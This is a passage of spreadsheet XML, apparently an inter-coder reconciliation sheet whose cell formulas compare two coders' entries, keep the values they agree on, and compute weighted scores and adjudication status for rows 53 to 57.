        <f>IF(AND(Coder1!U53&amp;""&lt;&gt;"",Coder1!U53&amp;""=Coder2!U53&amp;""),Coder1!U53,"")</f>
        <v/>
      </c>
      <c r="V53" s="14">
        <f>IF(AND(Coder1!V53&amp;""&lt;&gt;"",Coder1!V53&amp;""=Coder2!V53&amp;""),Coder1!V53,"")</f>
        <v/>
      </c>
      <c r="W53" s="14">
        <f>IF(AND(Coder1!W53&amp;""&lt;&gt;"",Coder1!W53&amp;""=Coder2!W53&amp;""),Coder1!W53,"")</f>
        <v/>
      </c>
      <c r="X53" s="14">
        <f>IF(AND(Coder1!X53&amp;""&lt;&gt;"",Coder1!X53&amp;""=Coder2!X53&amp;""),Coder1!X53,"")</f>
        <v/>
      </c>
      <c r="Y53" s="14">
        <f>IF(AND(Coder1!Y53&amp;""&lt;&gt;"",Coder1!Y53&amp;""=Coder2!Y53&amp;""),Coder1!Y53,"")</f>
        <v/>
      </c>
      <c r="Z53" s="14">
        <f>IF(AND(Coder1!Z53&amp;""&lt;&gt;"",Coder1!Z53&amp;""=Coder2!Z53&amp;""),Coder1!Z53,"")</f>
        <v/>
      </c>
      <c r="AA53" s="14">
        <f>IF(AND(Coder1!AA53&amp;""&lt;&gt;"",Coder1!AA53&amp;""=Coder2!AA53&amp;""),Coder1!AA53,"")</f>
        <v/>
      </c>
      <c r="AB53" s="14">
        <f>IF(AND(Coder1!AB53&amp;""&lt;&gt;"",Coder1!AB53&amp;""=Coder2!AB53&amp;""),Coder1!AB53,"")</f>
        <v/>
      </c>
      <c r="AC53" s="14">
        <f>IF(AND(Coder1!AC53&amp;""&lt;&gt;"",Coder1!AC53&amp;""=Coder2!AC53&amp;""),Coder1!AC53,"")</f>
        <v/>
      </c>
      <c r="AD53" s="14">
        <f>IF(AND(Coder1!AD53&amp;""&lt;&gt;"",Coder1!AD53&amp;""=Coder2!AD53&amp;""),Coder1!AD53,"")</f>
        <v/>
      </c>
      <c r="AE53" s="14">
        <f>IF(AND(Coder1!AE53&amp;""&lt;&gt;"",Coder1!AE53&amp;""=Coder2!AE53&amp;""),Coder1!AE53,"")</f>
        <v/>
      </c>
      <c r="AF53" s="14">
        <f>IF(AND(Coder1!AF53&amp;""&lt;&gt;"",Coder1!AF53&amp;""=Coder2!AF53&amp;""),Coder1!AF53,"")</f>
        <v/>
      </c>
      <c r="AG53" s="14">
        <f>IF(AND(Coder1!AG53&amp;""&lt;&gt;"",Coder1!AG53&amp;""=Coder2!AG53&amp;""),Coder1!AG53,"")</f>
        <v/>
      </c>
      <c r="AH53" s="14">
        <f>IF(AND(Coder1!AH53&amp;""&lt;&gt;"",Coder1!AH53&amp;""=Coder2!AH53&amp;""),Coder1!AH53,"")</f>
        <v/>
      </c>
      <c r="AI53" s="11">
        <f>IF(COUNT(E53:L53)=0,"",SUM(E53:L53))</f>
        <v/>
      </c>
      <c r="AJ53" s="11">
        <f>IF(AI53="","",N(E53)*3+N(F53)*2+N(G53)*2+N(H53)*2+N(I53)*2+N(J53)*3+N(K53)*3+N(L53)*3)</f>
        <v/>
      </c>
      <c r="AK53" s="11">
        <f>IF(AI53="","",COUNTIF(N53:AG53,1))</f>
        <v/>
      </c>
      <c r="AL53" s="11">
        <f>IF(OR(AJ53="",AJ53=0),"",ROUND(100*(AJ53-AK53)/AJ53,1))</f>
        <v/>
      </c>
      <c r="AM53" s="11">
        <f>IF(AND(Coder1!AN53=1,Coder2!AN53=1),IF(COUNTBLANK(E53:AH53)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN53" s="11">
        <f>IF(AND(Coder1!AN53=1,Coder2!AN53=1),IF(SUMPRODUCT(--(Coder1!E53:AH53&amp;""&lt;&gt;Coder2!E53:AH53&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO53" s="11" t="n"/>
    </row>
    <row r="54">
      <c r="A54" s="11">
        <f>Coder1!A54</f>
        <v/>
      </c>
      <c r="B54" s="11">
        <f>Coder1!B54</f>
        <v/>
      </c>
      <c r="C54" s="11">
        <f>Coder1!C54</f>
        <v/>
      </c>
      <c r="D54" s="11">
        <f>Coder1!D54</f>
        <v/>
      </c>
      <c r="E54" s="14">
        <f>IF(AND(Coder1!E54&amp;""&lt;&gt;"",Coder1!E54&amp;""=Coder2!E54&amp;""),Coder1!E54,"")</f>
        <v/>
      </c>
      <c r="F54" s="14">
        <f>IF(AND(Coder1!F54&amp;""&lt;&gt;"",Coder1!F54&amp;""=Coder2!F54&amp;""),Coder1!F54,"")</f>
        <v/>
      </c>
      <c r="G54" s="14">
        <f>IF(AND(Coder1!G54&amp;""&lt;&gt;"",Coder1!G54&amp;""=Coder2!G54&amp;""),Coder1!G54,"")</f>
        <v/>
      </c>
      <c r="H54" s="14">
        <f>IF(AND(Coder1!H54&amp;""&lt;&gt;"",Coder1!H54&amp;""=Coder2!H54&amp;""),Coder1!H54,"")</f>
        <v/>
      </c>
      <c r="I54" s="14">
        <f>IF(AND(Coder1!I54&amp;""&lt;&gt;"",Coder1!I54&amp;""=Coder2!I54&amp;""),Coder1!I54,"")</f>
        <v/>
      </c>
      <c r="J54" s="14">
        <f>IF(AND(Coder1!J54&amp;""&lt;&gt;"",Coder1!J54&amp;""=Coder2!J54&amp;""),Coder1!J54,"")</f>
        <v/>
      </c>
      <c r="K54" s="14">
        <f>IF(AND(Coder1!K54&amp;""&lt;&gt;"",Coder1!K54&amp;""=Coder2!K54&amp;""),Coder1!K54,"")</f>
        <v/>
      </c>
      <c r="L54" s="14">
        <f>IF(AND(Coder1!L54&amp;""&lt;&gt;"",Coder1!L54&amp;""=Coder2!L54&amp;""),Coder1!L54,"")</f>
        <v/>
      </c>
      <c r="M54" s="14">
        <f>IF(AND(Coder1!M54&amp;""&lt;&gt;"",Coder1!M54&amp;""=Coder2!M54&amp;""),Coder1!M54,"")</f>
        <v/>
      </c>
      <c r="N54" s="14">
        <f>IF(AND(Coder1!N54&amp;""&lt;&gt;"",Coder1!N54&amp;""=Coder2!N54&amp;""),Coder1!N54,"")</f>
        <v/>
      </c>
      <c r="O54" s="14">
        <f>IF(AND(Coder1!O54&amp;""&lt;&gt;"",Coder1!O54&amp;""=Coder2!O54&amp;""),Coder1!O54,"")</f>
        <v/>
      </c>
      <c r="P54" s="14">
        <f>IF(AND(Coder1!P54&amp;""&lt;&gt;"",Coder1!P54&amp;""=Coder2!P54&amp;""),Coder1!P54,"")</f>
        <v/>
      </c>
      <c r="Q54" s="14">
        <f>IF(AND(Coder1!Q54&amp;""&lt;&gt;"",Coder1!Q54&amp;""=Coder2!Q54&amp;""),Coder1!Q54,"")</f>
        <v/>
      </c>
      <c r="R54" s="14">
        <f>IF(AND(Coder1!R54&amp;""&lt;&gt;"",Coder1!R54&amp;""=Coder2!R54&amp;""),Coder1!R54,"")</f>
        <v/>
      </c>
      <c r="S54" s="14">
        <f>IF(AND(Coder1!S54&amp;""&lt;&gt;"",Coder1!S54&amp;""=Coder2!S54&amp;""),Coder1!S54,"")</f>
        <v/>
      </c>
      <c r="T54" s="14">
        <f>IF(AND(Coder1!T54&amp;""&lt;&gt;"",Coder1!T54&amp;""=Coder2!T54&amp;""),Coder1!T54,"")</f>
        <v/>
      </c>
      <c r="U54" s="14">
        <f>IF(AND(Coder1!U54&amp;""&lt;&gt;"",Coder1!U54&amp;""=Coder2!U54&amp;""),Coder1!U54,"")</f>
        <v/>
      </c>
      <c r="V54" s="14">
        <f>IF(AND(Coder1!V54&amp;""&lt;&gt;"",Coder1!V54&amp;""=Coder2!V54&amp;""),Coder1!V54,"")</f>
        <v/>
      </c>
      <c r="W54" s="14">
        <f>IF(AND(Coder1!W54&amp;""&lt;&gt;"",Coder1!W54&amp;""=Coder2!W54&amp;""),Coder1!W54,"")</f>
        <v/>
      </c>
      <c r="X54" s="14">
        <f>IF(AND(Coder1!X54&amp;""&lt;&gt;"",Coder1!X54&amp;""=Coder2!X54&amp;""),Coder1!X54,"")</f>
        <v/>
      </c>
      <c r="Y54" s="14">
        <f>IF(AND(Coder1!Y54&amp;""&lt;&gt;"",Coder1!Y54&amp;""=Coder2!Y54&amp;""),Coder1!Y54,"")</f>
        <v/>
      </c>
      <c r="Z54" s="14">
        <f>IF(AND(Coder1!Z54&amp;""&lt;&gt;"",Coder1!Z54&amp;""=Coder2!Z54&amp;""),Coder1!Z54,"")</f>
        <v/>
      </c>
      <c r="AA54" s="14">
        <f>IF(AND(Coder1!AA54&amp;""&lt;&gt;"",Coder1!AA54&amp;""=Coder2!AA54&amp;""),Coder1!AA54,"")</f>
        <v/>
      </c>
      <c r="AB54" s="14">
        <f>IF(AND(Coder1!AB54&amp;""&lt;&gt;"",Coder1!AB54&amp;""=Coder2!AB54&amp;""),Coder1!AB54,"")</f>
        <v/>
      </c>
      <c r="AC54" s="14">
        <f>IF(AND(Coder1!AC54&amp;""&lt;&gt;"",Coder1!AC54&amp;""=Coder2!AC54&amp;""),Coder1!AC54,"")</f>
        <v/>
      </c>
      <c r="AD54" s="14">
        <f>IF(AND(Coder1!AD54&amp;""&lt;&gt;"",Coder1!AD54&amp;""=Coder2!AD54&amp;""),Coder1!AD54,"")</f>
        <v/>
      </c>
      <c r="AE54" s="14">
        <f>IF(AND(Coder1!AE54&amp;""&lt;&gt;"",Coder1!AE54&amp;""=Coder2!AE54&amp;""),Coder1!AE54,"")</f>
        <v/>
      </c>
      <c r="AF54" s="14">
        <f>IF(AND(Coder1!AF54&amp;""&lt;&gt;"",Coder1!AF54&amp;""=Coder2!AF54&amp;""),Coder1!AF54,"")</f>
        <v/>
      </c>
      <c r="AG54" s="14">
        <f>IF(AND(Coder1!AG54&amp;""&lt;&gt;"",Coder1!AG54&amp;""=Coder2!AG54&amp;""),Coder1!AG54,"")</f>
        <v/>
      </c>
      <c r="AH54" s="14">
        <f>IF(AND(Coder1!AH54&amp;""&lt;&gt;"",Coder1!AH54&amp;""=Coder2!AH54&amp;""),Coder1!AH54,"")</f>
        <v/>
      </c>
      <c r="AI54" s="11">
        <f>IF(COUNT(E54:L54)=0,"",SUM(E54:L54))</f>
        <v/>
      </c>
      <c r="AJ54" s="11">
        <f>IF(AI54="","",N(E54)*3+N(F54)*2+N(G54)*2+N(H54)*2+N(I54)*2+N(J54)*3+N(K54)*3+N(L54)*3)</f>
        <v/>
      </c>
      <c r="AK54" s="11">
        <f>IF(AI54="","",COUNTIF(N54:AG54,1))</f>
        <v/>
      </c>
      <c r="AL54" s="11">
        <f>IF(OR(AJ54="",AJ54=0),"",ROUND(100*(AJ54-AK54)/AJ54,1))</f>
        <v/>
      </c>
      <c r="AM54" s="11">
        <f>IF(AND(Coder1!AN54=1,Coder2!AN54=1),IF(COUNTBLANK(E54:AH54)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN54" s="11">
        <f>IF(AND(Coder1!AN54=1,Coder2!AN54=1),IF(SUMPRODUCT(--(Coder1!E54:AH54&amp;""&lt;&gt;Coder2!E54:AH54&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO54" s="11" t="n"/>
    </row>
    <row r="55">
      <c r="A55" s="11">
        <f>Coder1!A55</f>
        <v/>
      </c>
      <c r="B55" s="11">
        <f>Coder1!B55</f>
        <v/>
      </c>
      <c r="C55" s="11">
        <f>Coder1!C55</f>
        <v/>
      </c>
      <c r="D55" s="11">
        <f>Coder1!D55</f>
        <v/>
      </c>
      <c r="E55" s="14">
        <f>IF(AND(Coder1!E55&amp;""&lt;&gt;"",Coder1!E55&amp;""=Coder2!E55&amp;""),Coder1!E55,"")</f>
        <v/>
      </c>
      <c r="F55" s="14">
        <f>IF(AND(Coder1!F55&amp;""&lt;&gt;"",Coder1!F55&amp;""=Coder2!F55&amp;""),Coder1!F55,"")</f>
        <v/>
      </c>
      <c r="G55" s="14">
        <f>IF(AND(Coder1!G55&amp;""&lt;&gt;"",Coder1!G55&amp;""=Coder2!G55&amp;""),Coder1!G55,"")</f>
        <v/>
      </c>
      <c r="H55" s="14">
        <f>IF(AND(Coder1!H55&amp;""&lt;&gt;"",Coder1!H55&amp;""=Coder2!H55&amp;""),Coder1!H55,"")</f>
        <v/>
      </c>
      <c r="I55" s="14">
        <f>IF(AND(Coder1!I55&amp;""&lt;&gt;"",Coder1!I55&amp;""=Coder2!I55&amp;""),Coder1!I55,"")</f>
        <v/>
      </c>
      <c r="J55" s="14">
        <f>IF(AND(Coder1!J55&amp;""&lt;&gt;"",Coder1!J55&amp;""=Coder2!J55&amp;""),Coder1!J55,"")</f>
        <v/>
      </c>
      <c r="K55" s="14">
        <f>IF(AND(Coder1!K55&amp;""&lt;&gt;"",Coder1!K55&amp;""=Coder2!K55&amp;""),Coder1!K55,"")</f>
        <v/>
      </c>
      <c r="L55" s="14">
        <f>IF(AND(Coder1!L55&amp;""&lt;&gt;"",Coder1!L55&amp;""=Coder2!L55&amp;""),Coder1!L55,"")</f>
        <v/>
      </c>
      <c r="M55" s="14">
        <f>IF(AND(Coder1!M55&amp;""&lt;&gt;"",Coder1!M55&amp;""=Coder2!M55&amp;""),Coder1!M55,"")</f>
        <v/>
      </c>
      <c r="N55" s="14">
        <f>IF(AND(Coder1!N55&amp;""&lt;&gt;"",Coder1!N55&amp;""=Coder2!N55&amp;""),Coder1!N55,"")</f>
        <v/>
      </c>
      <c r="O55" s="14">
        <f>IF(AND(Coder1!O55&amp;""&lt;&gt;"",Coder1!O55&amp;""=Coder2!O55&amp;""),Coder1!O55,"")</f>
        <v/>
      </c>
      <c r="P55" s="14">
        <f>IF(AND(Coder1!P55&amp;""&lt;&gt;"",Coder1!P55&amp;""=Coder2!P55&amp;""),Coder1!P55,"")</f>
        <v/>
      </c>
      <c r="Q55" s="14">
        <f>IF(AND(Coder1!Q55&amp;""&lt;&gt;"",Coder1!Q55&amp;""=Coder2!Q55&amp;""),Coder1!Q55,"")</f>
        <v/>
      </c>
      <c r="R55" s="14">
        <f>IF(AND(Coder1!R55&amp;""&lt;&gt;"",Coder1!R55&amp;""=Coder2!R55&amp;""),Coder1!R55,"")</f>
        <v/>
      </c>
      <c r="S55" s="14">
        <f>IF(AND(Coder1!S55&amp;""&lt;&gt;"",Coder1!S55&amp;""=Coder2!S55&amp;""),Coder1!S55,"")</f>
        <v/>
      </c>
      <c r="T55" s="14">
        <f>IF(AND(Coder1!T55&amp;""&lt;&gt;"",Coder1!T55&amp;""=Coder2!T55&amp;""),Coder1!T55,"")</f>
        <v/>
      </c>
      <c r="U55" s="14">
        <f>IF(AND(Coder1!U55&amp;""&lt;&gt;"",Coder1!U55&amp;""=Coder2!U55&amp;""),Coder1!U55,"")</f>
        <v/>
      </c>
      <c r="V55" s="14">
        <f>IF(AND(Coder1!V55&amp;""&lt;&gt;"",Coder1!V55&amp;""=Coder2!V55&amp;""),Coder1!V55,"")</f>
        <v/>
      </c>
      <c r="W55" s="14">
        <f>IF(AND(Coder1!W55&amp;""&lt;&gt;"",Coder1!W55&amp;""=Coder2!W55&amp;""),Coder1!W55,"")</f>
        <v/>
      </c>
      <c r="X55" s="14">
        <f>IF(AND(Coder1!X55&amp;""&lt;&gt;"",Coder1!X55&amp;""=Coder2!X55&amp;""),Coder1!X55,"")</f>
        <v/>
      </c>
      <c r="Y55" s="14">
        <f>IF(AND(Coder1!Y55&amp;""&lt;&gt;"",Coder1!Y55&amp;""=Coder2!Y55&amp;""),Coder1!Y55,"")</f>
        <v/>
      </c>
      <c r="Z55" s="14">
        <f>IF(AND(Coder1!Z55&amp;""&lt;&gt;"",Coder1!Z55&amp;""=Coder2!Z55&amp;""),Coder1!Z55,"")</f>
        <v/>
      </c>
      <c r="AA55" s="14">
        <f>IF(AND(Coder1!AA55&amp;""&lt;&gt;"",Coder1!AA55&amp;""=Coder2!AA55&amp;""),Coder1!AA55,"")</f>
        <v/>
      </c>
      <c r="AB55" s="14">
        <f>IF(AND(Coder1!AB55&amp;""&lt;&gt;"",Coder1!AB55&amp;""=Coder2!AB55&amp;""),Coder1!AB55,"")</f>
        <v/>
      </c>
      <c r="AC55" s="14">
        <f>IF(AND(Coder1!AC55&amp;""&lt;&gt;"",Coder1!AC55&amp;""=Coder2!AC55&amp;""),Coder1!AC55,"")</f>
        <v/>
      </c>
      <c r="AD55" s="14">
        <f>IF(AND(Coder1!AD55&amp;""&lt;&gt;"",Coder1!AD55&amp;""=Coder2!AD55&amp;""),Coder1!AD55,"")</f>
        <v/>
      </c>
      <c r="AE55" s="14">
        <f>IF(AND(Coder1!AE55&amp;""&lt;&gt;"",Coder1!AE55&amp;""=Coder2!AE55&amp;""),Coder1!AE55,"")</f>
        <v/>
      </c>
      <c r="AF55" s="14">
        <f>IF(AND(Coder1!AF55&amp;""&lt;&gt;"",Coder1!AF55&amp;""=Coder2!AF55&amp;""),Coder1!AF55,"")</f>
        <v/>
      </c>
      <c r="AG55" s="14">
        <f>IF(AND(Coder1!AG55&amp;""&lt;&gt;"",Coder1!AG55&amp;""=Coder2!AG55&amp;""),Coder1!AG55,"")</f>
        <v/>
      </c>
      <c r="AH55" s="14">
        <f>IF(AND(Coder1!AH55&amp;""&lt;&gt;"",Coder1!AH55&amp;""=Coder2!AH55&amp;""),Coder1!AH55,"")</f>
        <v/>
      </c>
      <c r="AI55" s="11">
        <f>IF(COUNT(E55:L55)=0,"",SUM(E55:L55))</f>
        <v/>
      </c>
      <c r="AJ55" s="11">
        <f>IF(AI55="","",N(E55)*3+N(F55)*2+N(G55)*2+N(H55)*2+N(I55)*2+N(J55)*3+N(K55)*3+N(L55)*3)</f>
        <v/>
      </c>
      <c r="AK55" s="11">
        <f>IF(AI55="","",COUNTIF(N55:AG55,1))</f>
        <v/>
      </c>
      <c r="AL55" s="11">
        <f>IF(OR(AJ55="",AJ55=0),"",ROUND(100*(AJ55-AK55)/AJ55,1))</f>
        <v/>
      </c>
      <c r="AM55" s="11">
        <f>IF(AND(Coder1!AN55=1,Coder2!AN55=1),IF(COUNTBLANK(E55:AH55)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN55" s="11">
        <f>IF(AND(Coder1!AN55=1,Coder2!AN55=1),IF(SUMPRODUCT(--(Coder1!E55:AH55&amp;""&lt;&gt;Coder2!E55:AH55&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO55" s="11" t="n"/>
    </row>
    <row r="56">
      <c r="A56" s="11">
        <f>Coder1!A56</f>
        <v/>
      </c>
      <c r="B56" s="11">
        <f>Coder1!B56</f>
        <v/>
      </c>
      <c r="C56" s="11">
        <f>Coder1!C56</f>
        <v/>
      </c>
      <c r="D56" s="11">
        <f>Coder1!D56</f>
        <v/>
      </c>
      <c r="E56" s="14">
        <f>IF(AND(Coder1!E56&amp;""&lt;&gt;"",Coder1!E56&amp;""=Coder2!E56&amp;""),Coder1!E56,"")</f>
        <v/>
      </c>
      <c r="F56" s="14">
        <f>IF(AND(Coder1!F56&amp;""&lt;&gt;"",Coder1!F56&amp;""=Coder2!F56&amp;""),Coder1!F56,"")</f>
        <v/>
      </c>
      <c r="G56" s="14">
        <f>IF(AND(Coder1!G56&amp;""&lt;&gt;"",Coder1!G56&amp;""=Coder2!G56&amp;""),Coder1!G56,"")</f>
        <v/>
      </c>
      <c r="H56" s="14">
        <f>IF(AND(Coder1!H56&amp;""&lt;&gt;"",Coder1!H56&amp;""=Coder2!H56&amp;""),Coder1!H56,"")</f>
        <v/>
      </c>
      <c r="I56" s="14">
        <f>IF(AND(Coder1!I56&amp;""&lt;&gt;"",Coder1!I56&amp;""=Coder2!I56&amp;""),Coder1!I56,"")</f>
        <v/>
      </c>
      <c r="J56" s="14">
        <f>IF(AND(Coder1!J56&amp;""&lt;&gt;"",Coder1!J56&amp;""=Coder2!J56&amp;""),Coder1!J56,"")</f>
        <v/>
      </c>
      <c r="K56" s="14">
        <f>IF(AND(Coder1!K56&amp;""&lt;&gt;"",Coder1!K56&amp;""=Coder2!K56&amp;""),Coder1!K56,"")</f>
        <v/>
      </c>
      <c r="L56" s="14">
        <f>IF(AND(Coder1!L56&amp;""&lt;&gt;"",Coder1!L56&amp;""=Coder2!L56&amp;""),Coder1!L56,"")</f>
        <v/>
      </c>
      <c r="M56" s="14">
        <f>IF(AND(Coder1!M56&amp;""&lt;&gt;"",Coder1!M56&amp;""=Coder2!M56&amp;""),Coder1!M56,"")</f>
        <v/>
      </c>
      <c r="N56" s="14">
        <f>IF(AND(Coder1!N56&amp;""&lt;&gt;"",Coder1!N56&amp;""=Coder2!N56&amp;""),Coder1!N56,"")</f>
        <v/>
      </c>
      <c r="O56" s="14">
        <f>IF(AND(Coder1!O56&amp;""&lt;&gt;"",Coder1!O56&amp;""=Coder2!O56&amp;""),Coder1!O56,"")</f>
        <v/>
      </c>
      <c r="P56" s="14">
        <f>IF(AND(Coder1!P56&amp;""&lt;&gt;"",Coder1!P56&amp;""=Coder2!P56&amp;""),Coder1!P56,"")</f>
        <v/>
      </c>
      <c r="Q56" s="14">
        <f>IF(AND(Coder1!Q56&amp;""&lt;&gt;"",Coder1!Q56&amp;""=Coder2!Q56&amp;""),Coder1!Q56,"")</f>
        <v/>
      </c>
      <c r="R56" s="14">
        <f>IF(AND(Coder1!R56&amp;""&lt;&gt;"",Coder1!R56&amp;""=Coder2!R56&amp;""),Coder1!R56,"")</f>
        <v/>
      </c>
      <c r="S56" s="14">
        <f>IF(AND(Coder1!S56&amp;""&lt;&gt;"",Coder1!S56&amp;""=Coder2!S56&amp;""),Coder1!S56,"")</f>
        <v/>
      </c>
      <c r="T56" s="14">
        <f>IF(AND(Coder1!T56&amp;""&lt;&gt;"",Coder1!T56&amp;""=Coder2!T56&amp;""),Coder1!T56,"")</f>
        <v/>
      </c>
      <c r="U56" s="14">
        <f>IF(AND(Coder1!U56&amp;""&lt;&gt;"",Coder1!U56&amp;""=Coder2!U56&amp;""),Coder1!U56,"")</f>
        <v/>
      </c>
      <c r="V56" s="14">
        <f>IF(AND(Coder1!V56&amp;""&lt;&gt;"",Coder1!V56&amp;""=Coder2!V56&amp;""),Coder1!V56,"")</f>
        <v/>
      </c>
      <c r="W56" s="14">
        <f>IF(AND(Coder1!W56&amp;""&lt;&gt;"",Coder1!W56&amp;""=Coder2!W56&amp;""),Coder1!W56,"")</f>
        <v/>
      </c>
      <c r="X56" s="14">
        <f>IF(AND(Coder1!X56&amp;""&lt;&gt;"",Coder1!X56&amp;""=Coder2!X56&amp;""),Coder1!X56,"")</f>
        <v/>
      </c>
      <c r="Y56" s="14">
        <f>IF(AND(Coder1!Y56&amp;""&lt;&gt;"",Coder1!Y56&amp;""=Coder2!Y56&amp;""),Coder1!Y56,"")</f>
        <v/>
      </c>
      <c r="Z56" s="14">
        <f>IF(AND(Coder1!Z56&amp;""&lt;&gt;"",Coder1!Z56&amp;""=Coder2!Z56&amp;""),Coder1!Z56,"")</f>
        <v/>
      </c>
      <c r="AA56" s="14">
        <f>IF(AND(Coder1!AA56&amp;""&lt;&gt;"",Coder1!AA56&amp;""=Coder2!AA56&amp;""),Coder1!AA56,"")</f>
        <v/>
      </c>
      <c r="AB56" s="14">
        <f>IF(AND(Coder1!AB56&amp;""&lt;&gt;"",Coder1!AB56&amp;""=Coder2!AB56&amp;""),Coder1!AB56,"")</f>
        <v/>
      </c>
      <c r="AC56" s="14">
        <f>IF(AND(Coder1!AC56&amp;""&lt;&gt;"",Coder1!AC56&amp;""=Coder2!AC56&amp;""),Coder1!AC56,"")</f>
        <v/>
      </c>
      <c r="AD56" s="14">
        <f>IF(AND(Coder1!AD56&amp;""&lt;&gt;"",Coder1!AD56&amp;""=Coder2!AD56&amp;""),Coder1!AD56,"")</f>
        <v/>
      </c>
      <c r="AE56" s="14">
        <f>IF(AND(Coder1!AE56&amp;""&lt;&gt;"",Coder1!AE56&amp;""=Coder2!AE56&amp;""),Coder1!AE56,"")</f>
        <v/>
      </c>
      <c r="AF56" s="14">
        <f>IF(AND(Coder1!AF56&amp;""&lt;&gt;"",Coder1!AF56&amp;""=Coder2!AF56&amp;""),Coder1!AF56,"")</f>
        <v/>
      </c>
      <c r="AG56" s="14">
        <f>IF(AND(Coder1!AG56&amp;""&lt;&gt;"",Coder1!AG56&amp;""=Coder2!AG56&amp;""),Coder1!AG56,"")</f>
        <v/>
      </c>
      <c r="AH56" s="14">
        <f>IF(AND(Coder1!AH56&amp;""&lt;&gt;"",Coder1!AH56&amp;""=Coder2!AH56&amp;""),Coder1!AH56,"")</f>
        <v/>
      </c>
      <c r="AI56" s="11">
        <f>IF(COUNT(E56:L56)=0,"",SUM(E56:L56))</f>
        <v/>
      </c>
      <c r="AJ56" s="11">
        <f>IF(AI56="","",N(E56)*3+N(F56)*2+N(G56)*2+N(H56)*2+N(I56)*2+N(J56)*3+N(K56)*3+N(L56)*3)</f>
        <v/>
      </c>
      <c r="AK56" s="11">
        <f>IF(AI56="","",COUNTIF(N56:AG56,1))</f>
        <v/>
      </c>
      <c r="AL56" s="11">
        <f>IF(OR(AJ56="",AJ56=0),"",ROUND(100*(AJ56-AK56)/AJ56,1))</f>
        <v/>
      </c>
      <c r="AM56" s="11">
        <f>IF(AND(Coder1!AN56=1,Coder2!AN56=1),IF(COUNTBLANK(E56:AH56)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN56" s="11">
        <f>IF(AND(Coder1!AN56=1,Coder2!AN56=1),IF(SUMPRODUCT(--(Coder1!E56:AH56&amp;""&lt;&gt;Coder2!E56:AH56&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO56" s="11" t="n"/>
    </row>
    <row r="57">
      <c r="A57" s="11">
        <f>Coder1!A57</f>
        <v/>
      </c>
      <c r="B57" s="11">
        <f>Coder1!B57</f>
        <v/>
      </c>
      <c r="C57" s="11">
        <f>Coder1!C57</f>
        <v/>
      </c>
      <c r="D57" s="11">
        <f>Coder1!D57</f>
        <v/>
      </c>
      <c r="E57" s="14">
        <f>IF(AND(Coder1!E57&amp;""&lt;&gt;"",Coder1!E57&amp;""=Coder2!E57&amp;""),Coder1!E57,"")</f>
        <v/>
      </c>
      <c r="F57" s="14">
        <f>IF(AND(Coder1!F57&amp;""&lt;&gt;"",Coder1!F57&amp;""=Coder2!F57&amp;""),Coder1!F57,"")</f>
        <v/>
      </c>
      <c r="G57" s="14">
        <f>IF(AND(Coder1!G57&amp;""&lt;&gt;"",Coder1!G57&amp;""=Coder2!G57&amp;""),Coder1!G57,"")</f>
        <v/>
      </c>
      <c r="H57" s="14">
        <f>IF(AND(Coder1!H57&amp;""&lt;&gt;"",Coder1!H57&amp;""=Coder2!H57&amp;""),Coder1!H57,"")</f>
        <v/>
      </c>
      <c r="I57" s="14">
        <f>IF(AND(Coder1!I57&amp;""&lt;&gt;"",Coder1!I57&amp;""=Coder2!I57&amp;""),Coder1!I57,"")</f>
        <v/>
      </c>
      <c r="J57" s="14">
        <f>IF(AND(Coder1!J57&amp;""&lt;&gt;"",Coder1!J57&amp;""=Coder2!J57&amp;""),Coder1!J57,"")</f>
        <v/>
      </c>
      <c r="K57" s="14">
        <f>IF(AND(Coder1!K57&amp;""&lt;&gt;"",Coder1!K57&amp;""=Coder2!K57&amp;""),Coder1!K57,"")</f>
        <v/>
      </c>
      <c r="L57" s="14">
        <f>IF(AND(Coder1!L57&amp;""&lt;&gt;"",Coder1!L57&amp;""=Coder2!L57&amp;""),Coder1!L57,"")</f>
        <v/>
      </c>
      <c r="M57" s="14">
        <f>IF(AND(Coder1!M57&amp;""&lt;&gt;"",Coder1!M57&amp;""=Coder2!M57&amp;""),Coder1!M57,"")</f>
        <v/>
      </c>
      <c r="N57" s="14">
        <f>IF(AND(Coder1!N57&amp;""&lt;&gt;"",Coder1!N57&amp;""=Coder2!N57&amp;""),Coder1!N57,"")</f>
        <v/>
      </c>
      <c r="O57" s="14">
        <f>IF(AND(Coder1!O57&amp;""&lt;&gt;"",Coder1!O57&amp;""=Coder2!O57&amp;""),Coder1!O57,"")</f>
        <v/>
      </c>
      <c r="P57" s="14">
        <f>IF(AND(Coder1!P57&amp;""&lt;&gt;"",Coder1!P57&amp;""=Coder2!P57&amp;""),Coder1!P57,"")</f>
        <v/>
      </c>
      <c r="Q57" s="14">
        <f>IF(AND(Coder1!Q57&amp;""&lt;&gt;"",Coder1!Q57&amp;""=Coder2!Q57&amp;""),Coder1!Q57,"")</f>
        <v/>
      </c>
      <c r="R57" s="14">
        <f>IF(AND(Coder1!R57&amp;""&lt;&gt;"",Coder1!R57&amp;""=Coder2!R57&amp;""),Coder1!R57,"")</f>
        <v/>
      </c>
      <c r="S57" s="14">
        <f>IF(AND(Coder1!S57&amp;""&lt;&gt;"",Coder1!S57&amp;""=Coder2!S57&amp;""),Coder1!S57,"")</f>
        <v/>
      </c>
      <c r="T57" s="14">
        <f>IF(AND(Coder1!T57&amp;""&lt;&gt;"",Coder1!T57&amp;""=Coder2!T57&amp;""),Coder1!T57,"")</f>
        <v/>
      </c>
      <c r="U57" s="14">
        <f>IF(AND(Coder1!U57&amp;""&lt;&gt;"",Coder1!U57&amp;""=Coder2!U57&amp;""),Coder1!U57,"")</f>
        <v/>
      </c>
      <c r="V57" s="14">
        <f>IF(AND(Coder1!V57&amp;""&lt;&gt;"",Coder1!V57&amp;""=Coder2!V57&amp;""),Coder1!V57,"")</f>
        <v/>
      </c>
      <c r="W57" s="14">
        <f>IF(AND(Coder1!W57&amp;""&lt;&gt;"",Coder1!W57&amp;""=Coder2!W57&amp;""),Coder1!W57,"")</f>
        <v/>
      </c>
      <c r="X57" s="14">
